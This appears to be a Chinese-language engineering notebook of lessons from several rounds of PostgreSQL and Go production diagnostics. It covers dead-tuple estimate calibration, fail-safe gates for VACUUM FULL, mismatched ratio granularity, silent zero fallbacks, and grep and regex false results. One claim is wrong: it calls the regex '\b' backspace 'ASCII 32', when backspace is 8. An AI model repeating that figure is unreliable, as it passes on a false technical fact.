⇒ ⇒ 本轮据此补了确认闸，而不是记一句「实测 0 命中，暂无风险」。

### ⭐⭐⭐⭐ fail-safe 的方向要写进代码，而不是留给判断

确认闸有三种出口：达标 ⇒ 做；不达标 ⇒ SKIP；**量不出来 ⇒ SKIP**。
第三条最容易被写成「量不了就当达标」（我自己的变异 B 就是这么拆的）。

⇒ ⇒ ★★★ 通用式：⭐⭐⭐⭐ **「量不出来」必须与「量出来不够」走同一个出口，
否则机制会在量具失效时静默转成「全做」——而量具失效正是它最该保守的时刻。**
★ 同族：[[量具不可用与真没问题必须可区分]] · [[0 命中的第一嫌疑永远是量具坏了]]。

### ⭐⭐⭐ 普查的产出不只是「找到第二个」，还有「**证明只有一个**」

修完 §116 时只能说「这一处修好了」；做完 §117 普查才能说
「**生产 cron 上带雷的只有这一处**」。
⇒ ⇒ ★★ 阴性结论同样要有证据链（本节逐个列了 5 个作业的判据与确认闸），
否则「只有一处」只是「我只看了这一处」的另一种说法。
★ 同族：[[阴性结论要当缺陷一样复核]] · [[§15 的教训：「某门绿了」≠「不存在这样的门」]]。

## 2026-10-19 §118 轮：校准要用**生产真值**；fail-safe 让「做不了」变得看不出来

### ⭐⭐⭐⭐⭐ 校准必须用生产真值，而且要报**倍数**，不只报「偏了」

§117 给确认闸写门禁时，判据用的是我编的夹具（估算 52.3% / 实测 3.1%）。
§118 用生产真表 `session_summaries` 重算：

```
估算 dead_pct = 62,877/(800,561+62,877) = 7.29%
实测 pgstattuple_approx               = 0.346%
⇒ n_dead_tup 在本库高估约 21 倍
```

⇒ ⇒ ★★★ §117 只能说「pg_stat 两个方向都会偏，所以不是理论风险」；
**「会偏」与「偏 21 倍」是两个量级的结论**，后者才能让人判断门槛该定多少。

⇒ ⇒ ★★★ 通用式：⭐⭐⭐⭐⭐ **「不准」不是一个可行动的结论，「差多少倍」才是。**
⇒ ⇒ ★★★⭐ **挑校准表的标准**：全库唯一一个「两个量都归位」的表 ——
`session_summaries` 是唯一 `n_live_tup` 非 0 的（PG 重启后被 VACUUM/ANALYZE 带回），
所以它同时给出了估算分母与分子的可信来源。
★ 判别动作：**校准前先问「有没有一张表，两个量都活着」**；
没有就找能让它活过来的那张（ANALYZE/VACUUM），而不是拿合成夹具凑。
★ 合成夹具的噪声形态是你想象的（§110 已记），生产真表的偏差结构里有「方差消失」这类
夹具里根本不存在的东西。

### ⭐⭐⭐⭐⭐ 这次校准里最要紧的一句话：**两法结果一致，不等于闸没用**

估算 7.29%、实测 0.346%，**都低于 30% 门槛** ⇒ 这一趟闸确实没拦住任何东西。
如果就此写「闸没起作用，实测与估算一致」，就是拿一次巧合当验证。

⇒ ⇒ ★★★ **闸的价值在于「换一张表/换一个门槛它会拦住」，不在于「这一次它拦没拦」。**
⇒ ⇒ 通用式：⭐⭐⭐⭐⭐ **当两次测量给出一致结果时，要明确区分三种情况**：
(a) 闸确实起作用了；(b) 闸恰好与估算同侧；(c) 闸根本没参与。
**只有 (a) 能支持「闸有用」的结论**，而 (b) 与 (c) 在输出上长得一模一样。
⇒ ⇒ 判别动作：**换一组能让结论翻转的输入再跑一次**（把估算值提到门槛之上）。
本轮门禁就是这么写的：`TestVacuumBloatSkipsAtProductionCalibration`
用「估算 30.0% / 实测 0.3%」这个**只可能由闸拦住**的组合。
★ 同族：[[判据要钉「唯一可能的原因」]] · [[假阴性也可能长得像结论]]。

### ⭐⭐⭐⭐⭐ fail-safe 让「错做」不可能，同时让「做不了」变得看不出来

§117 的确认闸有三条出口：达标 ⇒ 做；不达标 ⇒ SKIP；**量不出来 ⇒ SKIP**。
本节实测发现 `pgstattuple_approx` 对**列存表**必然报 `only heap AM is supported`
⇒ 列存表**永远**走第三条出口 ⇒ 日志写「量不出来」，
**读起来与「扩展没装」一模一样**。

⇒ ⇒ ★★★ **这是 fail-safe 的固有代价，不是实现 bug** ——
但它足以让人三年后误判「这个量具从来没装过」。
⇒ ⇒ 通用式：⭐⭐⭐⭐ **fail-safe 的分支必须能区分「不能做」与「不想做」**；
当「不能做」是**永久性**的（格式不支持）而不是偶发的（超时），
它应当在**上一层**就被排除，而不是留到运行时失败。
⇒ ⇒ ★★ 判别动作：**量具失败要问「会不会每次都失败」。**
每次都失败 ⇒ 那是范围声明缺失（该在候选层排除），不是容错缺失。
⇒ ⇒ ★★ 排除的位置也有讲究：在**候选层**排除，口径才是**看得见的**
（读 SQL 就知道列存不在范围内）；靠运行时失败排除，日志里只能看到症状。
★ 同族：[[阴性结论要当缺陷一样复核]] · [[fail-safe 与「看不见」是两件事]]。

### ⭐⭐⭐⭐ 同一张表里有两个统计量，**一个准一个废** —— 先量准的那个差多少

§116 点名 5 张表全部是 `n_live_tup = 0`。§118 把权威量补上后发现：

| 量 | 误差 | 生命周期 |
|---|---|---|
| `pg_class.reltuples` | **0.0% ~ 7.8%** | **跨 PG 重启保留** |
| `pg_stat_user_tables.n_live_tup` | **100%** | **PG 重启即清零** |

⇒ ⇒ ★★★ 两者都叫「统计的行数」，口径只差一个重启行为，误差差 100 倍以上。
⇒ ⇒ 通用式：⭐⭐⭐⭐ **看到「统计值是 0」时，先确认它属于哪一族** ——
`pg_stat*` 视图（活到本次重启）与 `pg_class`/`pg_statistic`（活过重启）是两种东西。
★ 本仓已因这条错过两次（§93/§107），现在有实测对照表了。
⇒ ⇒ ★★ 顺带记一条**当时没走的更便宜的路**：判据换成 `reltuples = 0` 也能拦住那 5 张。
**但没换** —— `reltuples` 对「从未 ANALYZE 的新表」也是 0（那种确实空、可安全 DROP），
语义成立，可它**仍是估计量**；承重数字必须是 `count(*)`。
⇒ ⇒ ★★ **「有一个更便宜且当时也成立的办法」不等于「该用便宜的」** ——
**记下它、说明为什么不选，比默默不写要好**，否则下一个人会以为没想过。

### ⭐⭐⭐ 用**交叉验证**给读数背书

`pgstattuple_approx` 实测 100~130 MB/s（852MB→5.95s、857MB→8.12s）；
§115 独立测过 `pgstatindex` 热态 60~115 MB/s。两个不同函数、不同数据结构，
**真读页的速率同量级** ⇒ 两边读数互相加固。

⇒ ⇒ ★★ 通用式：**新读数能和一个旧读数「量纲一致」对上是意外收获，别浪费。**
它比单次自测更能排除「我这次测法有问题」。
★ 前提是两者确实在做同一类事（都真读页）—— 量纲一致本身不能证明机制相同。

### ⭐⭐⭐ 变异要挑**合法变异**，并看红的是不是**精准的那一条**

拆候选 SQL 时，把 `AND am.amname = 'heap'` 整行删掉 ⇒ **只有**新增那条门红，
其余 5 条仍绿（因为它们都在测确认闸，不在测候选层）。
反过来把比较改成 `if false`（`bash -n` 仍过，是**合法变异**）⇒ 两条 SKIP 门红。

⇒ ⇒ ★★★ 通用式：⭐⭐⭐⭐ **「一部分红、一部分绿」正是变异验证的产出** ——
红的范围精确说明**每个门各自负责哪一层**。
★ 全红只说明「都依赖同一处」，看不出分层；精准命中才说明分层是对的。
★ 同族：[[变异没施加 ≠ 判据无敏感性]] —— 合法变异（语法过）比打坏脚本更有说服力。

## 2026-10-19 §119 轮：**把「待拍板的阈值」变成有分布依据的判断**；比例选不出该做的事

### ⭐⭐⭐⭐⭐ 参数默认值不该靠直觉拍 —— 用**真实分布**把阈值放到有依据的位置

`MIN_DEAD_PCT = 30` 挂了三天「待拍板，因为只能靠阈值直觉」。
本轮不拍板，而是先量出分布：44 张堆表大表、6 个样本真值校准。

⇒ 结论不是「该调到多少」，而是**「按比例调这个阈值，调到哪儿都是错的」**。

### ⭐⭐⭐⭐⭐ 「两个量几乎脱钩」时，先问**代价与收益各跟哪个量成正比**

死元组比例最高的表（`stats_event_inbox_default` 5.574%）可回收空间最小（2.8 MB）；
比例最低的表之一（`session_project_attribution` 0.369%）可回收空间最大（16.2 MB）。

⇒ ⇒ ★★★ 而 `VACUUM FULL` 的**代价（整表重写 + 30 分钟 ACCESS EXCLUSIVE）
只跟表体积成正比**，**收益只跟 `approx_free_space` 成正比**。
⇒ ⇒ ⇒ **对一个量做决策时，判据必须落在「收益的那个量」上**；
如果只能观测到「代理量」，就要显式说明它和收益的关联有多强。
⇒ ⇒ ★★ 本轮最有价值的是一条**负面结论**：把阈值从 30% 降到 5%
（一个看起来「更主动」的修法）会让脚本**开始做负收益的事** ——
44 张里只入选 1 张，而那张只能回收 2.8 MB。
★ **「阈值太保守，调低一点更主动」是本行最常见的错误直觉之一**：
它只在「收益与该阈值成正比」时成立，而这个前提很少被验证。
★ 同族：[[校准要报差多少倍]] · [[先读量具再读产物]]。

### ⭐⭐⭐⭐⭐ 「估算出错」时，先问它**能不能被校正**——本轮答案是不能

6 个样本，估算**全部**高估，倍数 **1.5× ~ 21.1×**，中位 5.5×。

⇒ ⇒ ★★★ **范围这么宽 ⇒ 不存在一个固定系数能把估算换算成实测。**
⇒ ⇒ ★★ 这从数据上证明：**「估算出错就乘个系数修正」是比「加确认闸」更差的修法** ——
系数取多少都会在另一个样本上错，而它看起来更省事。
⇒ ⇒ 判别动作：拿到多个校准样本后，**先算倍数的分布再决定怎么用估算值**；
只有一个样本时，任何「修正系数」都是幻觉。
★ 同族：[[校准要报差多少倍]] —— 那条讲「要报倍数」，这条讲「报完倍数还要看分布宽不宽」。

### ⭐⭐⭐⭐ 阴性分布本身也是证据：「命中 0 行」不等于「判据写错了」

44 张大表的估算最高只到 **8.51%**，离 30% 差 3.5 倍。
上一轮复现脚本命中 0 行时，我登记的是「当前恰好落在安全方向」。

⇒ ⇒ ★★★ 本轮把分布摆出来后，这条登记可以升级为**确定的结论**：
**不是筛选条件写错，是这个库的 autovacuum 在正常工作。**
⇒ ⇒ ★★ 通用式：⭐⭐⭐⭐ **「阈值之上 0 命中」有两种读法（库干净 / 阈值失效），
把它们分开靠的是分布位置，不是再跑一次。**
★ 同族：[[阴性结论要当缺陷一样复核]] —— 复核阴性的正确姿势是**扩大样本看分布**。

### ⭐⭐⭐⭐ 我自己算错了一次，且是本手册反复警告过的那类错

整理表格时用 `max(r for *_, r, _, _ in rows)` 取「实测最高」，
而元组是 `(name, mb, est, real, free)` —— `*_, r, _, _` 把 `r` 对到了 `est` 上。
输出「30% 门槛高 21.7 倍」—— 而正确答案是 **5.4 倍**（对实测最高的 5.574%）。

⇒ ⇒ ★★ 一眼看出不对：上一行刚说「估算最高 8.51%」，30/8.51 = 3.5，
怎么会是 21.7？**输出的量纲和上一行的量纲不一致**。
⇒ ⇒ ★★★ 判别动作：**解包/取下标算完，回头核对「这个量的量纲和上下文对不对得上」**。
★ 这个坑与记忆里 [[统计表里的「合计」必须由明细算出]] 同族 ——
都是「算式本身没错，错在取错了输入」。

### ⭐⭐⭐ 设计变更的判据：**没实测收益就不要在文档里宣称收益**

我给出的替代判据（「`approx_free_space` > 256MB」）逻辑上更对，
但我在 §119 里明确写了**它没有跑过一轮**，且「负收益」结论是基于
`free_space` 与表体积的**推算**而非实测账。

⇒ ⇒ ★★★ 通用式：⭐⭐⭐ **改判据前先问「收益那一侧我实测过吗」**。
只测了「触发条件」没测「收益」的，等于只验证了机制的一半，
而另一半往往是**决定要不要做**的那一半。
⇒ ⇒ ★★ 于是本轮**没有改代码**，只把证据与两种取舍写清楚交属主拍 ——
「不擅自改」不等于「不做」，是把判断依据准备好。

## 2026-10-19 §120 轮：刺眼读数先问**分子分母是不是同一个粒度**；「整齐归零」是断链的指纹

### ⭐⭐⭐⭐⭐ 看到刺眼的百分比，第一问不是「这个比例合理吗」，而是「**分子和分母是同一个粒度吗**」

`is_final_success = 12.36%` 读起来就是「88% 的业务请求失败了」。
本轮查完代码发现：它是「**该会话的最终成功轮次**」标记 ——
partial unique index `(tenant_id, session_id, partition_date) WHERE is_final_success`
强制**每会话至多一个**，而分母是**全部 turn**。
一个会话三轮对话 = 3 个分母、1 个分子。

⇒ ⇒ ★★★ **把「会话粒度的分子」除以「轮次粒度的分母」，
得到的既不是成功率也不是任何比率 —— 它只是「轮次/会话比」的倒数。**
⇒ ⇒ ★★★ 通用式：⭐⭐⭐⭐⭐ **任何比率型读数，先确认两个量是不是同一个实体类型**
（同一张表还不够，要同一粒度：请求/轮次/会话/用户/天）。
⇒ ⇒ ★★ 判别动作：**去 DB 看列的默认值与约束、再到代码里看谁写它、写了什么**。
本例那三列是普通列无 `pg_attrdef`，说明口径只能从 Go 代码找 ——
**计算列看 SQL，普通列看代码，两条路都要走**。
⇒ ⇒ ★★ 更狠的是数据自己会纠正你：查「distinct session_id / turns」才发现
**真实上限是 90.59%**，于是「8.65%」这个刺眼的读数瞬间变成
「相对上限只到 9.6%」—— **不查上限就不知道该拿它和什么比**。
★ 同族：[[统计表里的「合计」必须由明细算出]] · [[先读量具再读产物]]。

### ⭐⭐⭐⭐⭐ 「一直偏低」和「某天起归零」是完全不同的两件事，**只有按时间分段才能分开**

同一个字段，全月聚合是 8.65%，读起来像「长期偏低、可能是设计如此」。
按日一拆：

```
10-08 ~ 10-12：9.67 → 17.82 → 15.97 → 24.03 → 27.86%   ← 逐日上升，链路在生效
10-13（当天）：6.77%                                    ← 断点在当天，不是午夜
10-14 起：    0.00%  × 6 天
```

⇒ ⇒ ★★★ **聚合把一个「断链」伪装成了「一个偏低的比率」。**
⇒ ⇒ ★★★⭐ 而且断点落在当天内 ⇒ 它是**某个时刻的事件**，不是周期性现象。
⇒ ⇒ ★★★ 通用式：⭐⭐⭐⭐ **任何长期偏低/偏高的指标，都要先按时间分段看一次**；
「有没有一个断点」比「平均水平是多少」信息量大一个量级。
⇒ ⇒ ★★ 判别动作：`date_trunc('day', ts)` 分组 —— 一条查询，几十秒。

### ⭐⭐⭐⭐⭐ **「整齐归零」是断链的指纹，「部分丢失」不是**

归零当天 turns 仍有 11,691 行、次日 13,044 行，且逐日 1.3 万~2.6 万行。
⇒ ⇒ ★★★ **数据在写，只有一个环节停了。** 若真是丢失/竞争，
会是**按比例的、离散的**，不会这么干净。
⇒ ⇒ ★★ 通用式：⭐⭐⭐⭐ **结果的形态能反推成因**：
整齐归零 ⇒ 开关/门控/路径被关；按比例缺失 ⇒ 竞争/超时/资源；
锯齿 ⇒ 周期性任务或采样。
⇒ ★ 同族：[[0 命中的第一嫌疑永远是量具坏了]] ——
「归零」的第一嫌疑应当是**某个布尔量**（门控、开关、路径开关），而不是「写失败」。

### ⭐⭐⭐⭐⭐ 时间相关性能当因果吗？——**仓内可查的机制 + 小时级吻合 = 强推断，但要写清还差什么**

门控 `updated_at = 2026-10-13 20:18:27` ⇒ 标记率断在 10-13 当天；
机制链在代码里完整可查（`if logsWrite && shouldClaimFinalSuccess(entry)`）。

⇒ ⇒ ★★★ 这是**强推断**，但我在文档里明确写了它**不是受控实验**：
要坐实得「临时开门控看标记是否恢复」，那是生产写。
⇒ ⇒ ★★ 通用式：⭐⭐⭐⭐ **「相关 + 机制可查 + 时间吻合」可以支撑行动，
但支撑不了「已坐实」的措辞** —— 写结论时把这两者分开，评审的人才知道该不该要受控验证。
⇒ ⇒ ★★ 同时记下**缺哪一侧证据**：本节只有 DB 侧，没有 252 应用日志证明
claim 函数在 20:18 后不再被调用 ⇒ 补一条「找运行时日志」进待办。
★ 同族：[[阴性结论要当缺陷一样复核]] · [[先追一层再下结论]]。

### ⭐⭐⭐⭐ 已知缺陷会**复发**，而且症状相同、原因不同 ⇒ 复现时先查原因是否同源

`final_success_turn.go:21-30` 记录了 2026-09-30 的事故：
「该列恒 NULL ⇒ `deriveTurnOutcome` 的 `final_success` / `superseded_success` 两个 arm 全死」。
10-14 起**一模一样的事情又发生了**，但原因不同：

| | 09-30 | 10-14 |
|---|---|---|
| 原因 | 从未被写入（实现没落地） | 实现是好的，被**有意的**门控切断 |
| 「补写路径」管用吗 | ✅ 管用 | ❌ **完全不管用**（门控关着就没有 claim） |

⇒ ⇒ ★★★ **照搬上次的修法，这次会完全无效。**
⇒ ⇒ ★★ 通用式：⭐⭐⭐⭐ **遇到疑似复发，先确认「成因是否同源」再决定要不要照搬上次的补丁**；
症状相同是最容易被骗的地方。
⇒ ⇒ ★★★⭐ 而本例的修法根本不该由工程决定：门控是**有意关的**（为停写入省空间），
取舍在属主 ⇒ **「只摆事实与因果、不提改法」在这里才是正确的动作**。
★ 同族：[[先读量具再读产物]] · [[fail-safe 与「看不见」是两件事]]。

## 2026-10-19 §121 轮：`grep -c` 出来的**非零**也要先看内容；「0 条」先查日志级别

### ⭐⭐⭐⭐⭐ **非零命中与零命中一样需要复核量具** —— 而且更危险

统计 final-success claim 日志用了 `grep -icE "final_success|final-success|claim"`，
得到「10-14 仍有 61 条」⇒ 按 §120 的因果链，这本该是**推翻结论的证据**。

翻内容才发现那 61 条一条都不是：
```
msg="dispatch journal snapshot receipt claim failed"
msg="credentialfpslot: reclaim loop started"
```
⇒ **`claim` 同时匹配了 `reclaim` 和 `receipt claim`**，两个都是高频噪音。
若只看计数就下结论，会写出一个完整的**假反证**。

⇒ ⇒ ★★★ 通用式：⭐⭐⭐⭐⭐ **`grep -c` 的非零，第一步是看几条实际内容**，
不是开始解释它意味着什么。
「数字对」和「量具测的是你要的那个东西」是两件事。
⇒ ⇒ ★★ 修法：**用代码里真实的日志串**（`final_success pad`），不用通用词。
★ 纪律上的不对称值得记住：零命中时我们知道它「可能是量具坏了」；
**非零命中时我们容易直接开始解释 —— 而这正是最容易被假阳性带偏的地方**。
★ 同族：[[0 命中的第一嫌疑永远是量具坏了]] —— 本节是该条的**镜像形态**：
**非零的第一嫌疑也可能是量具量错了对象**。

### ⭐⭐⭐⭐⭐ 「0 条日志」先查**日志级别**，再谈它证明了什么

§121 查出 10-14 起 `final_success` 相关日志为 0，分母是每天 10 万~32 万条。
看起来是铁证 —— 但读完代码发现：

| 结果 | 日志级别 | 落 journal 吗 |
|---|---|---|
| `mark`（正常成功） | **无 slog**，只有 prometheus 计数器 | ❌ |
| `mark_noop`（幂等重跑） | `slog.Debug` | ❌ **journal 默认不记 DEBUG** |
| `mark_failed` / `mark_no_row` | `slog.Warn` | ✅ |

⇒ ⇒ ★★★ **「0 条」只能证明「异常路径绝迹」，不能证明「函数没被调用」。**
若它仍在跑且每次都成功（或都是 DEBUG 级幂等），输出同样是 0。
⇒ ⇒ ★★★ 通用式：⭐⭐⭐⭐⭐ **判「某代码路径停止运行」之前，
先确认「它正常运行时会留下什么痕迹」。**
**正常运行不打日志的实现，零日志是它的常态，不是不运行的证据。**
⇒ ⇒ ★★ 正确做法：**主证据选那个「正常运行必产生痕迹」的地方** ——
本例是 DB 里的列值（若 claim 成功必然产生 TRUE，而它一个都没有）。
运行时日志在这里的角色是**辅证**：它排除了「日志链路本身断了」这个替代解释。
★ 同族：[[量具不可用与真没问题必须可区分]] · [[阴性结论要当缺陷一样复核]]。

### ⭐⭐⭐⭐ 「同一设计的两侧做交叉验证」能把推断变成证明

`final_success_turn.go:42-47` 声称「v1 是唯一仲裁者，v2 只镜像它的裁决」。
实测：

| 表 | 14 天窗口 `fs_true` |
|---|---|
| v1 `request_logs_2026_10` | **19,193** |
| v2 `session_turns_2026_10` | **19,193** |

⇒ ⇒ ★★★ **逐条相同** ⇒ 设计在数据上成立。
⇒ ⇒ ★★★ 而整月 v1 比 v2 多 9,960 个，且差额**全部在 14 天窗口之外**
⇒ ⇒ ★★ 正好对应「v2 镜像代码 10-05 才落地，那段历史从未被镜像」，
**一条差值同时解释了两个现象**（9 月 v2 为 0、整月两侧不等）。
⇒ ⇒ ★★ 通用式：⭐⭐⭐⭐ **当两侧数据应当一致时，不一致本身就是信息** ——
先确认「应当一致」有代码依据，再把差额**定位到时间段**，
差额往往会同时解释另外几个本来要单独解释的现象。

### ⭐⭐⭐⭐ 找证据前先确认**证据在哪台机器上**

§120 的待办写的是「找 252 应用日志」，因为 252 是运维机。
实际：**252 上根本没有网关服务**（只有 mesh 暴露），且 journal 只剩 10-18 一次启动；
**154** 上 `llm-gateway-go-canary@8781` 在跑、journal 从 10-11 起，恰好覆盖事件时点。

⇒ ⇒ ★★★ **「证据在这台机器上」本身要验证，尤其当那台机器是按角色记忆指定的。**
⇒ ⇒ ★★ 判别动作：先 `systemctl list-units` + `journalctl --list-boots`
—— 两条只读命令就能确认「服务在不在、记录够不够早」。
★ 本例若按原待办去 252 找，会得到「无日志」这个**看似干净的阴性结论**，
而真相是「找错机器」。

### ⭐⭐⭐ 排除到 6 个口径仍对不上时，如实记「未定位」，**不要为它编解释**

§111 的 `is_final_success = 12.36%`，本轮试了 6 个口径
（v1/v2 整月、7 天、14 天、30 天窗口 ⇒ 1.92% ~ 9.34%）**没有一个匹配**。

⇒ ⇒ ★★★ 最可能的解释是「§111 是门控关闭前测的，14 天窗口整段落在标记生效期」——
但**没有验证就不写进结论**，只登记为「读数出处未定」。
⇒ ⇒ ★★ 通用式：⭐⭐⭐ **假设写下来要标明是假设**；
「最可能是因为 X」在文档里会立刻变成下一个人引用的事实。
★ 同族：[[假阴性也可能长得像结论]] · [[计数极刺眼 ≠ 结论]]。

## 2026-10-19 §122 轮：把 §114 的结论**订正到位** —— 「静默零」不在 SQL 层，在 Go 的零值兜底

### ⭐⭐⭐⭐⭐ **「SQL 返回 NULL」被 Go 的零值兜底改成 0 ⇒ 「没有数据」被谎报成「全是失败」**

`system_health_status()` 在 SQL 层是**诚实**的：窗口内 0 行 ⇒
`status='suspect'` 且 `success_rate` 返回 **NULL**（不是 0）。

把 NULL 变成 0 的是 `bg/system_health.go:130-133`：
```go
sr := 0.0
if successRate != nil { sr = *successRate }
```
⇒ 实测生产 API：`{"status":"suspect","success_rate":0,...}`，而 `/readyz` 是 **200**。
⇒ ⇒ ★★★ **同一个服务的两个接口在说不同的话：健康检查「可疑 + 成功率 0%」，就绪检查「正常」。**
⇒ ⇒ ★★★ 通用式：⭐⭐⭐⭐⭐ **语言里的零值不是「无值」的合法表示**；
从 DB / 接口把「NULL / 不存在」取出来赋给数值字段时，
**必须在那个转换点显式区分「未知」与「零」**，否则一个诚实的 NULL 会在下游变成一个谎报。
⇒ ⇒ ★★ 判别动作：**看到 `:= 0.0` / `= ""` / `= nil` 这类兜底赋值，
先问「这条路径上真的可能合法地是零吗」** —— 若不可能，兜底就等于编造。
★ 同族：[[量具不可用与真没问题必须可区分]] —— 「量不出来」被当成「量出来是 0」，
是同一个错误的两种形态。

### ⭐⭐⭐⭐⭐ 同族两个函数**抗门控能力不同** ⇒ 「失效」不是全有全无，是分对象的

| 函数 | 数据源 | 门控关闭后（实测） |
|---|---|---|
| `recent_success_rate` | `_request_logs_hot` **UNION ALL** `session_turns_hot` | ✅ **正常**：`rate=1, samples=50` |
| `system_health_status` | **只有** `_request_logs_hot` | 🚨 `suspect` + `sample_count=0` |

⇒ ⇒ ★★★ ⇒ **必须把普查做完才能说「一族里只有几处」** ——
§117 那条纪律（写端 cron 普查）在这里原样复现（读端函数普查）。
⇒ ⇒ ★★ 一个函数有兜底源、另一个没有，**差别只是作者当时想到了没有**，
代码里没有任何地方标注这一点 ⇒ 下一个读它的人必然踩坑。
★ 同族：[[发现缺陷时先列全同族分支]]。

### ⭐⭐⭐⭐ 「pg_depend 里没有」≠「没引用」—— 对**字符串体函数**尤其如此

查「哪些函数引用了 v1 家族」，用 `pg_depend` + `pg_class` 关联，得到 **0 行**；
而实际有 **26 个**。原因是它们都是 `LANGUAGE sql` 的 `AS $function$...$function$` **字符串体**，
**函数体内的表引用不产生依赖记录**（PG 14+ 的 `BEGIN ATOMIC` 标准体语法才记）。

⇒ ⇒ ★★★ 判别动作：**查「谁引用了 X」时，先问 X 是以什么形式被引用的** ——
规范化对象（视图 rewrite、FK、触发器）走 `pg_depend`，**字符串体里的 SQL 不走**。
⇒ ⇒ ★★ 改用 `pg_get_functiondef(oid) LIKE '%…%'` 才列全。
★ 同族：[[grep 命中字段名后必须确认它属于哪个 struct 和哪张表]] ——
同样是「名字对上了不等于那是我以为的那个东西」。

### ⭐⭐⭐⭐ **筛选器命中 100% 时，先怀疑筛选器本身**

用「函数体是否含 `insert|update|delete|…`」给 26 个函数分读写，结果 **26/26 全中**，
连 595 字节的 `credential_most_used_model` 也中 —— 过度匹配了**注释里的词**。

⇒ ⇒ ★★★ **判别动作：筛选器给出「全部命中」时，它多半不具判别力**（要么恒真、要么恒假）。
本例是恒真。
⇒ ⇒ ★★ 好在这个方向的错误是**保守的**（把纯读误判成有写 ⇒ 不去调它），
所以仍可用作筛选器 —— **但判定必须靠读定义**。
⇒ ⇒ ★★ 通用式：⭐⭐⭐⭐ **筛选器（估计量）只用来「缩小可疑集」，不用于定案**；
这与「凡接不可逆动作的判据必须用权威量复核」是同一条纪律的另一种形态。

### ⭐⭐⭐⭐ 从名字判断副作用 ⇒ **宁可错杀不可错调**

26 个函数里有 `cleanup_stale_in_progress_requests`、`promoke_*`、`archive_*`、`drop_*`
—— 单看名字就知道**大概率会写库**。

⇒ ⇒ ★★★ 判别动作：调用 DB 函数前**先读定义**，按「STABLE/VOLATILE + 是否纯 SELECT」分类；
本节只调了**两个** `STABLE` 且定义确认纯 `SELECT` 的函数，
**26 个里 25 个全程未调用**（尤其 `cleanup_stale_in_progress_requests`）。
⇒ ⇒ ★★ 误调一个写函数 = 在生产上执行一次不可逆动作；
误判「不能调」只是少一条数据 ⇒ **这类错误代价不对称，筛选器该往保守侧偏**。

### ⭐⭐⭐ 订正自己的旧结论时，要说清**哪部分对、哪部分错**

§114 写的是「`recent_success_rate()` 等 7 函数读恒空表 ⇒ 静默零」。
本节实测：`recent_success_rate` **完全正常**（有兜底源），
真正静默的是 `system_health_status`，而**位置在 Go 的零值兜底而非 SQL**。

⇒ ⇒ ★★★ ⇒ 订正时写成「方向对、载体错」，并给出实测输出，
而不是笼统的「之前说错了」—— 下一个人需要知道**哪部分结论还能用**。
⇒ ⇒ ★★ 通用式：⭐⭐⭐ **订正保留可用的部分**，
否则读者会把「结论错」误当成「那一整段分析都不可信」。
★ 同族：[[错误结论就地加订正横幅 + 保留原文]]。

## 2026-10-19 §123 轮：**滚动时间窗口是静默失效的放大器**；静默有四种形态，最危险的是「假良好」

### ⭐⭐⭐⭐⭐ 归零的机制是**窗口长度**，不是停写时刻 —— 所以「归零」本身就是滞后信号

`v_timeout_effectiveness`：`WHERE ts > (now() - '24:00:00'::interval)`。
数据源停写后它**不会立刻归零**，而是在「停写时刻 + 24 小时」之后才归零。

⇒ ⇒ ★★★ 通用式：⭐⭐⭐⭐⭐ **有滑动时间窗口的读端，在数据源停写后会经历一段
「看起来完全正常但其实是陈旧数据」的过渡期** ——
它的失效时间点由**窗口长度**决定，而不是由停写时刻决定。
⇒ ⇒ ★★ 判别动作：**看定义里的时间窗口**，就能预测这个读端会在停写后多久开始说谎。
★ 推论：窗口 7 天的报表，停写后要 7 天才暴露；窗口 24 小时的，1 天。
⇒ **越长的窗口，故障暴露得越晚** —— 这与直觉相反。

### ⭐⭐⭐⭐⭐ 「静默失效」有四种形态，**最危险的恰好是最安静的**

| 形态 | 表现 | 有无异常信号 | 判例 |
|---|---|---|---|
| ① 假零 | 返回 `0` | 有（别的接口会打架） | `success_rate: 0` 而 `/readyz` 200 |
| ② 假疑 | 返回 `suspect` | 有 | `system_health_status` |
| ③ **假新鲜** | 返回 33 万行**停写前**旧数据，名字却叫 `with_current_month` | **无** | `request_logs_bodies_with_current_month` |
| ④ **假良好** | 滚动窗口归零，被读成「指标良好」 | **无** | `timeout_rate` 无行 ⇒ 「最近没有超时」 |

⇒ ⇒ ★★★ **形态 ④ 最危险**：一个健康类指标的空结果，
会被读成「指标良好」而不是「指标失明」。
⇒ ⇒ ★★★ 形态 ③ 次之：数据量完全正常，只是全部是旧的。
⇒ ⇒ ★★ 通用式：⭐⭐⭐⭐ **给「不知道」设计一个和「值为零」长得不一样的表示** ——
形态 ①② 有信号是因为它们恰好返回了可疑值；③④ 没有信号是因为它们**看起来是正常数据**。
⇒ ★★ 同一族：[[零值兜底编造未知]] —— 形态 ①④ 是它的两个变体。

### ⭐⭐⭐⭐⭐ **秒级吻合**把「时间相关」升级为强推断，且代价极低

门控 `updated_at = 2026-10-13 20:18:27.656301`；
v1 父表最后一笔 `max(ts) = 2026-10-13 20:18:11.634426` ⇒ **相差 16 秒**。

⇒ ⇒ ★★★ 无缓存延迟、无渐进停写、无「最后一个 in-flight 请求」——
因果链在这个粒度上闭合了。
⇒ ⇒ ★★ 判别动作：**找「被切断的那条数据流」的最后一条记录，比找日志便宜且精确得多**。
`SELECT ts FROM t ORDER BY ts DESC LIMIT 1` 一条查询即可。
★ 同族：[[整齐归零是断链的指纹]] —— 本条是它的**精确版**：
不仅知道「什么时候断的」，还知道「断的那一刻」与「开关那一刻」差 16 秒。

### ⭐⭐⭐⭐ `pg_get_viewdef(...) ~ '\b'` 在 PostgreSQL 里是**假阴性**的重灾区

用 `~ '_request_logs\b'` 判「视图是否引用 v1 家族」，得到 **12 个全 `f`**；
而 `pg_depend` 已经证明它们全部引用。

⇒ ⇒ 🚨 **PGRE 里 `\b` 是退格符（ASCII 32），不是词边界。**
词边界是 **`\y`**（还有 `\m` 词首 / `\M` 词尾）。
⇒ ⇒ ★★★ **输出完全正常（一个规整的 false 列），没有任何异常信号**，
比「计数异常」更难发现。
⇒ ⇒ ★★★ 通用式：⭐⭐⭐⭐ **写完正则，先拿一个「已知为真」的样本自测它能命中，再信它的假。**
分类型判据的 `false` 与 `0` 一样，是最容易被假阴性污染的输出。
★ 同族：[[0 命中的第一嫌疑永远是量具坏了]] —— 但本条更隐蔽：
那次是数量异常，这次是**分类全错而输出看起来毫无问题**。

### ⭐⭐⭐ 拿视图的「数据源」比拿它的「定义文本」更好用

`regexp_matches(pg_get_viewdef(oid,true), '(FROM|JOIN)\s+([a-z_][a-z0-9_.]*)', 'gi')`
一次性把 12 个视图的数据源列成表，于是立刻能分出三类：
**有 session 兜底的 / 只读 v1 父表的 / 依赖其他视图的**。

